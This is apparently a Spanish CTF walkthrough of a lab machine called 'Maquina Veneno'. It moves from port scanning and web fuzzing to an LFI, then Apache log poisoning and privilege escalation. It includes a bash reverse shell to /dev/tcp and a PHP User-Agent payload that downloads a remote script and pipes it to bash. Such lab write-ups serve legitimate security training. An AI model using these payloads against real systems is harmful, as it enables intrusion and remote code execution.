# Maquina Veneno

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

### Fuzzing Web

gobuster dir -t 200 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

![alt text](image-2.png)

### Entramos en problems.php

![alt text](image-3.png)

al parecer se trata de un LFI

ejecutamos:

wfuzz -c --hc=404 --hw=961 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/problems.php?FUZZ=../../../../../etc/passwd

![alt text](image-4.png)

el parámetro vulnerable es backdoor

### Log poisoning

verificación de la ruta de los logs

wfuzz -c --hc=404 --hw=0 -t 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://172.17.0.2/problems.php?backdoor=FUZZ

![alt text](image-5.png)

pudimos ver los logs, en la ruta /var/logs/apache2/acces.log

### Intrusión

1.- Creamos un archivo shell con el siguiente contenido:

bash -i >& /dev/tcp/172.17.0.1/443 0>&1

2.- Enviamos la shell por curl.

curl -i 172.17.0.2 -A "<?php system('curl 172.17.0.1:8080/shell | bash'); ?>"

3.- Levantamos un servidor con python

python3 -m http.server 8080

4.- Recargamos la web con la url que tiene el /var/log/apache2/access.log

5.- Ponemos en escucha con netcat

sudo nc -nlvp 443


Hacemos tratamiento de la tty.

vemos los usuarios

![alt text](image-7.png)

en /var/www/html hay un archivo llamado antiguo_y_fuerte.txt que contiene lo siguiente:

![alt text](image-6.png)

entonces busqué: find / -name "*.txt" 2>/dev/null y encontramos un archivo llamado /usr/share/viejuno/inhackeable_pass.txt que contiene la contraseña del usuario carlos:

### Escalar privilegios.

Siendo el usuario Carlos, entramos en /home/carlos y encontramos una imagen oculta:

![alt text](image-8.png)

la descargamos en nuestra kali y ejecutamos exiftool:

![alt text](image-9.png)

esa es la contraseña de root:

![alt text](image-10.png)